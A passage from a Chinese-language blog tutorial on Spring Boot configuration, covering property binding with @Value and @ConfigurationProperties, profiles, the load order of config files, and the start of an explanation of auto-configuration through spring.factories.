title="1、properties配置文件在idea中默认utf-8可能会乱码"></a>1、properties配置文件在idea中默认utf-8可能会乱码</h4><p>调整</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180130161620.png" alt="idea配置乱码"></p><h4 id="2、-Value获取值和-ConfigurationProperties获取值比较"><a href="#2、-Value获取值和-ConfigurationProperties获取值比较" class="headerlink" title="2、@Value获取值和@ConfigurationProperties获取值比较"></a>2、@Value获取值和@ConfigurationProperties获取值比较</h4><table><thead><tr><th></th><th>@ConfigurationProperties</th><th>@Value</th></tr></thead><tbody><tr><td>功能</td><td>批量注入配置文件中的属性</td><td>一个个指定</td></tr><tr><td>松散绑定（松散语法）</td><td>支持</td><td>不支持</td></tr><tr><td>SpEL</td><td>不支持</td><td>支持</td></tr><tr><td>JSR303数据校验</td><td>支持</td><td>不支持</td></tr><tr><td>复杂类型封装</td><td>支持</td><td>不支持</td></tr></tbody></table><p>配置文件yml还是properties他们都能获取到值；</p><p>如果说，我们只是在某个业务逻辑中需要获取一下配置文件中的某项值，使用@Value；</p><p>如果说，我们专门编写了一个javaBean来和配置文件进行映射，我们就直接使用@ConfigurationProperties；</p><h4 id="3、配置文件注入值数据校验"><a href="#3、配置文件注入值数据校验" class="headerlink" title="3、配置文件注入值数据校验"></a>3、配置文件注入值数据校验</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = "person")</span></span><br><span class="line"><span class="meta">@Validated</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> {</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * &lt;bean class="Person"&gt;</span></span><br><span class="line"><span class="comment">     *      &lt;property name="lastName" value="字面量/${key}从环境变量、配置文件中获取值/#{SpEL}"&gt;&lt;/property&gt;</span></span><br><span class="line"><span class="comment">     * &lt;bean/&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//lastName必须是邮箱格式</span></span><br><span class="line">    <span class="meta">@Email</span></span><br><span class="line">    <span class="comment">//@Value("${person.last-name}")</span></span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="comment">//@Value("#{11*2}")</span></span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="comment">//@Value("true")</span></span><br><span class="line">    <span class="keyword">private</span> Boolean boss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Date birth;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,Object&gt; maps;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Object&gt; lists;</span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br></pre></td></tr></tbody></table></figure><h4 id="4、-PropertySource-amp-ImportResource-amp-Bean"><a href="#4、-PropertySource-amp-ImportResource-amp-Bean" class="headerlink" title="4、@PropertySource&amp;@ImportResource&amp;@Bean"></a>4、@PropertySource&amp;@ImportResource&amp;@Bean</h4><p>@<strong>PropertySource</strong>：加载指定的配置文件；</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将配置文件中配置的每一个属性的值，映射到这个组件中</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ConfigurationProperties</span>：告诉SpringBoot将本类中的所有属性和配置文件中相关的配置进行绑定；</span></span><br><span class="line"><span class="comment"> *      prefix = "person"：配置文件中哪个下面的所有属性进行一一映射</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 只有这个组件是容器中的组件，才能容器提供的<span class="doctag">@ConfigurationProperties</span>功能；</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@ConfigurationProperties</span>(prefix = "person")默认从全局配置文件中获取值；</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@PropertySource(value = {"classpath:person.properties"})</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = "person")</span></span><br><span class="line"><span class="comment">//@Validated</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> {</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * &lt;bean class="Person"&gt;</span></span><br><span class="line"><span class="comment">     *      &lt;property name="lastName" value="字面量/${key}从环境变量、配置文件中获取值/#{SpEL}"&gt;&lt;/property&gt;</span></span><br><span class="line"><span class="comment">     * &lt;bean/&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//lastName必须是邮箱格式</span></span><br><span class="line">   <span class="comment">// @Email</span></span><br><span class="line">    <span class="comment">//@Value("${person.last-name}")</span></span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="comment">//@Value("#{11*2}")</span></span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="comment">//@Value("true")</span></span><br><span class="line">    <span class="keyword">private</span> Boolean boss;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>@<strong>ImportResource</strong>：导入Spring的配置文件，让配置文件里面的内容生效；</p><p>Spring Boot里面没有Spring的配置文件，我们自己编写的配置文件，也不能自动识别；</p><p>想让Spring的配置文件生效，加载进来；@<strong>ImportResource</strong>标注在一个配置类上</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ImportResource(locations = {"classpath:beans.xml"})</span></span><br><span class="line">导入Spring的配置文件让其生效</span><br></pre></td></tr></tbody></table></figure><p>不来编写Spring的配置文件</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"helloService"</span> <span class="attr">class</span>=<span class="string">"com.atguigu.springboot.service.HelloService"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>SpringBoot推荐给容器中添加组件的方式；推荐使用全注解的方式</p><p>1、配置类**@Configuration**——&gt;Spring配置文件</p><p>2、使用**@Bean**给容器中添加组件</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Configuration</span>：指明当前类是一个配置类；就是来替代之前的Spring配置文件</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 在配置文件中用&lt;bean&gt;&lt;bean/&gt;标签添加组件</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAppConfig</span> {</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将方法的返回值添加到容器中；容器中这个组件默认的id就是方法名</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> HelloService <span class="title function_">helloService02</span><span class="params">()</span>{</span><br><span class="line">        System.out.println(<span class="string">"配置类@Bean给容器中添加组件了..."</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">HelloService</span>();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>##4、配置文件占位符</p><h3 id="1、随机数"><a href="#1、随机数" class="headerlink" title="1、随机数"></a>1、随机数</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">${random.value}、${random.<span class="type">int</span>}、${random.<span class="type">long</span>}</span><br><span class="line">${random.<span class="type">int</span>(<span class="number">10</span>)}、${random.<span class="type">int</span>[<span class="number">1024</span>,<span class="number">65536</span>]}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="2、占位符获取之前配置的值，如果没有可以是用-指定默认值"><a href="#2、占位符获取之前配置的值，如果没有可以是用-指定默认值" class="headerlink" title="2、占位符获取之前配置的值，如果没有可以是用:指定默认值"></a>2、占位符获取之前配置的值，如果没有可以是用:指定默认值</h3><figure class="highlight properties"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">person.last-name</span>=<span class="string">张三${random.uuid}</span></span><br><span class="line"><span class="attr">person.age</span>=<span class="string">${random.int}</span></span><br><span class="line"><span class="attr">person.birth</span>=<span class="string">2017/12/15</span></span><br><span class="line"><span class="attr">person.boss</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">person.maps.k1</span>=<span class="string">v1</span></span><br><span class="line"><span class="attr">person.maps.k2</span>=<span class="string">14</span></span><br><span class="line"><span class="attr">person.lists</span>=<span class="string">a,b,c</span></span><br><span class="line"><span class="attr">person.dog.name</span>=<span class="string">${person.hello:hello}_dog</span></span><br><span class="line"><span class="attr">person.dog.age</span>=<span class="string">15</span></span><br></pre></td></tr></tbody></table></figure><h2 id="5、Profile"><a href="#5、Profile" class="headerlink" title="5、Profile"></a>5、Profile</h2><h3 id="1、多Profile文件"><a href="#1、多Profile文件" class="headerlink" title="1、多Profile文件"></a>1、多Profile文件</h3><p>我们在主配置文件编写的时候，文件名可以是   application-{profile}.properties/yml</p><p>默认使用application.properties的配置；</p><h3 id="2、yml支持多文档块方式"><a href="#2、yml支持多文档块方式" class="headerlink" title="2、yml支持多文档块方式"></a>2、yml支持多文档块方式</h3><figure class="highlight yml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">prod</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8083</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span> <span class="string">dev</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8084</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span> <span class="string">prod</span>  <span class="comment">#指定属于哪个环境</span></span><br></pre></td></tr></tbody></table></figure><h3 id="3、激活指定profile"><a href="#3、激活指定profile" class="headerlink" title="3、激活指定profile"></a>3、激活指定profile</h3><p>​    1、在配置文件中指定  spring.profiles.active=dev</p><p>​    2、命令行：</p><p>​        java -jar spring-boot-02-config-0.0.1-SNAPSHOT.jar –spring.profiles.active=dev；</p><p>​        可以直接在测试的时候，配置传入命令行参数</p><p>​    3、虚拟机参数；</p><p>​        -Dspring.profiles.active=dev</p><h2 id="6、配置文件加载位置"><a href="#6、配置文件加载位置" class="headerlink" title="6、配置文件加载位置"></a>6、配置文件加载位置</h2><p>springboot 启动会扫描以下位置的application.properties或者application.yml文件作为Spring boot的默认配置文件</p><p>–file:./config/</p><p>–file:./</p><p>–classpath:/config/</p><p>–classpath:/</p><p>优先级由高到底，高优先级的配置会覆盖低优先级的配置；</p><p>SpringBoot会从这四个位置全部加载主配置文件；<strong>互补配置</strong>；</p><p>==我们还可以通过spring.config.location来改变默认的配置文件位置==</p><p><strong>项目打包好以后，我们可以使用命令行参数的形式，启动项目的时候来指定配置文件的新位置；指定配置文件和默认加载的这些配置文件共同起作用形成互补配置；</strong></p><p>java -jar spring-boot-02-config-02-0.0.1-SNAPSHOT.jar –spring.config.location=G:/application.properties</p><h2 id="7、外部配置加载顺序"><a href="#7、外部配置加载顺序" class="headerlink" title="7、外部配置加载顺序"></a>7、外部配置加载顺序</h2><p><strong>==SpringBoot也可以从以下位置加载配置； 优先级从高到低；高优先级的配置覆盖低优先级的配置，所有的配置会形成互补配置==</strong></p><p><strong>1.命令行参数</strong></p><p>所有的配置都可以在命令行上进行指定</p><p>java -jar spring-boot-02-config-02-0.0.1-SNAPSHOT.jar –server.port=8087  –server.context-path=/abc</p><p>多个配置用空格分开； –配置项=值</p><p>2.来自java:comp/env的JNDI属性</p><p>3.Java系统属性（System.getProperties()）</p><p>4.操作系统环境变量</p><p>5.RandomValuePropertySource配置的random.*属性值</p><p>==<strong>由jar包外向jar包内进行寻找；</strong>==</p><p>==<strong>优先加载带profile</strong>==</p><p><strong>6.jar包外部的application-{profile}.properties或application.yml(带spring.profile)配置文件</strong></p><p><strong>7.jar包内部的application-{profile}.properties或application.yml(带spring.profile)配置文件</strong></p><p>==<strong>再来加载不带profile</strong>==</p><p><strong>8.jar包外部的application.properties或application.yml(不带spring.profile)配置文件</strong></p><p><strong>9.jar包内部的application.properties或application.yml(不带spring.profile)配置文件</strong></p><p>10.@Configuration注解类上的@PropertySource</p><p>11.通过SpringApplication.setDefaultProperties指定的默认属性</p><p>所有支持的配置加载来源；</p><p><a href="https://docs.spring.io/spring-boot/docs/1.5.9.RELEASE/reference/htmlsingle/#boot-features-external-config">参考官方文档</a></p><h2 id="8、自动配置原理"><a href="#8、自动配置原理" class="headerlink" title="8、自动配置原理"></a>8、自动配置原理</h2><p>配置文件到底能写什么？怎么写？自动配置原理；</p><p><a href="https://docs.spring.io/spring-boot/docs/1.5.9.RELEASE/reference/htmlsingle/#common-application-properties">配置文件能配置的属性参照</a></p><h3 id="1、自动配置原理："><a href="#1、自动配置原理：" class="headerlink" title="1、自动配置原理："></a>1、<strong>自动配置原理：</strong></h3><p>1）、SpringBoot启动的时候加载主配置类，开启了自动配置功能 ==@EnableAutoConfiguration==</p><p><strong>2）、@EnableAutoConfiguration 作用：</strong></p><ul><li><p>利用EnableAutoConfigurationImportSelector给容器中导入一些组件？</p></li><li><p>可以查看selectImports()方法的内容；</p></li><li><p>List<string> configurations = getCandidateConfigurations(annotationMetadata,      attributes);获取候选的配置</string></p><ul><li>```java<br>SpringFactoriesLoader.loadFactoryNames()<br>扫描所有jar包类路径下  META-INF/spring.factories<br>把扫描到的这些文件的内容包装成properties对象<br>从properties中获取到EnableAutoConfiguration.class类（类名）对应的值，然后把他们添加在容器中<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">**==将 类路径下  META-INF/spring.factories 里面配置的所有EnableAutoConfiguration的值加入到了容器中；==**</span><br><span class="line"></span><br><span class="line">```properties</span><br><span class="line"># Auto Configure</span><br><span class="line">org.springframework.boot.autoconfigure.EnableAutoConfiguration=\</span><br><span class="line">org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.aop.AopAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.amqp.RabbitAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.batch.BatchAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.cache.CacheAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.cassandra.CassandraAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.cloud.CloudAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.context.ConfigurationPropertiesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.context.MessageSourceAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.context.PropertyPlaceholderAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.couchbase.CouchbaseAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.dao.PersistenceExceptionTranslationAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.cassandra.CassandraDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.cassandra.CassandraRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.couchbase.CouchbaseDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.couchbase.CouchbaseRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.jpa.JpaRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.ldap.LdapDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.ldap.LdapRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.mongo.MongoDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.mongo.MongoRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.neo4j.Neo4jDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.neo4j.Neo4jRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.solr.SolrRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.redis.RedisRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.rest.RepositoryRestMvcAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.web.SpringDataWebAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.elasticsearch.jest.JestAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.freemarker.FreeMarkerAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.gson.GsonAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.h2.H2ConsoleAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.hateoas.HypermediaAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.hazelcast.HazelcastAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.hazelcast.HazelcastJpaDependencyAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.info.ProjectInfoAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.integration.IntegrationAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jdbc.JdbcTemplateAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jdbc.JndiDataSourceAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jdbc.XADataSourceAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jms.JmsAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jmx.JmxAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jms.JndiConnectionFactoryAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jms.activemq.ActiveMQAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jms.artemis.ArtemisAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.flyway.FlywayAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.groovy.template.GroovyTemplateAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jersey.JerseyAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jooq.JooqAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.kafka.KafkaAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.ldap.embedded.EmbeddedLdapAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.ldap.LdapAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.liquibase.LiquibaseAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mail.MailSenderAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mail.MailSenderValidatorAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mobile.DeviceResolverAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mobile.DeviceDelegatingViewResolverAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mobile.SitePreferenceAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mongo.embedded.EmbeddedMongoAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mongo.MongoAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mustache.MustacheAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.orm.jpa.HibernateJpaAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.reactor.ReactorAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.security.SecurityAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.security.SecurityFilterAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.security.FallbackWebSecurityAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.security.oauth2.OAuth2AutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.sendgrid.SendGridAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.session.SessionAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.social.SocialWebAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.social.FacebookAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.social.LinkedInAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.social.TwitterAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.solr.SolrAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.transaction.TransactionAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.transaction.jta.JtaAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.validation.ValidationAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.DispatcherServletAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.EmbeddedServletContainerAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.HttpEncodingAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.HttpMessageConvertersAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.MultipartAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.ServerPropertiesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.WebClientAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.WebMvcAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.websocket.WebSocketAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.websocket.WebSocketMessagingAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.webservices.WebServicesAutoConfiguration</span><br></pre></td></tr></tbody></table></figure></li></ul></li></ul><p>每一个这样的  